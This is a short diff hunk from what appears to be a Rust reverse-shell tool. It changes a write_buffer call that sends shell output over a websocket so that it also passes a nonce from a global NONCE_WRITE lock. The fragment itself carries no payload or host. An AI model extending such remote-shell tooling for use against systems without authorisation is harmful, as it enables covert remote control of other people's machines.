@@ -51,7 +51,8 @@ impl ReverseShell {
                                     write_buffer(
                                         &mut ws_lock,
                                         Command::ShellOutput(cmd_buffer.to_string()),
-                                        &secret
+                                        &secret,
+                                        crate::NONCE_WRITE.lock().unwrap().as_mut()
                                     );
                                     cmd_buffer.clear();
                                 }
